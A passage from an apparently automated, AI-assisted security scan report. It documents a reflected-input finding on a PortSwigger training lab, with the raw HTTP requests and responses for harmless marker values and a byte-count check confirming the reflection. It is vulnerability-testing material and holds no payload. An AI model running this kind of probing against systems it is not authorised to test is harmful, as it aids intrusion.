                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [burp✓] Input returned in response (reflected)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control (message=benign-out-of-stock-value, 25 chars) produced a 14456-byte body without the marker; both positive replays (message=umbraR3fl3ct7788, 16 chars) produced identical 14447-byte bodies — the exact 9-byte delta equals the value-length difference, proving the input is reflected once into the response, stable across two replays. (severity raised info→high: confirmed real, not info-only)

The value of the <b>message</b> request parameter is copied into the application's response. (confidence: CERTAIN) @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6j5znt-3c` — `artifacts/_/ev-mr6j5znt-3c/`

Request:

```http
GET / HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net

GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stockglfn8jz3in HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14483

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>Unfortunately this product is out of stockglfn8jz3in
</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
```

- Evidence `ev-mr6j6pnk-3d` — `artifacts/_/ev-mr6j6pnk-3d/`

Request:

```http
GET /?message=benign-out-of-stock-value HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 2785
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>benign-out-of-stock-value
</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6j6t18-3e` — `artifacts/_/ev-mr6j6t18-3e/`

Request:

```http
GET /?message=umbraR3fl3ct7788 HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 2779
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>umbraR3fl3ct7788
</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
